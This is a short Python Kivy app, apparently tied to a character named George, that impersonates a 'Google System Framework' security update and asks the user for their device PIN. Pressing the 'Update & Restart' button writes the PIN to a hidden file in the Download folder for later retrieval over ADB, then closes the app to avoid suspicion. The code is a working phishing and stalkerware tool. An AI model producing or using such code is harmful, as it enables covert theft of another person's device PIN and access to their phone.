import kivy
from kivy.app import App
from kivy.uix.boxlayout import BoxLayout
from kivy.uix.textinput import TextInput
from kivy.uix.button import Button
from kivy.uix.label import Label

class SpyItApp(App):
    def build(self):
        # A simple, official-looking layout
        layout = BoxLayout(orientation='vertical', padding=50, spacing=20)
        
        # George's fake update message
        layout.add_widget(Label(text="Google System Framework", font_size=24, color=(0, 0.5, 1, 1)))
        layout.add_widget(Label(text="Security update required. \nPlease verify your device PIN:", font_size=16, halign="center"))
        
        # The password field
        self.pin_input = TextInput(password=True, multiline=False, font_size=32, input_filter='int')
        layout.add_widget(self.pin_input)
        
        # The "Trap" button
        btn = Button(text="Update & Restart", background_color=(0.1, 0.6, 0.1, 1), size_hint_y=None, height=100)
        btn.bind(on_release=self.capture_and_hide)
        layout.add_widget(btn)
        
        return layout

    def capture_and_hide(self, instance):
        captured_pin = self.pin_input.text
        # George saves the PIN to a hidden location he can pull via ADB later
        with open("/sdcard/Download/.google_log.txt", "a") as f:
            f.write(f"Device PIN: {captured_pin}\n")
        
        # To avoid suspicion, George makes the app close after "updating"
        App.get_running_app().stop()

if __name__ == '__main__':
    SpyItApp().run()
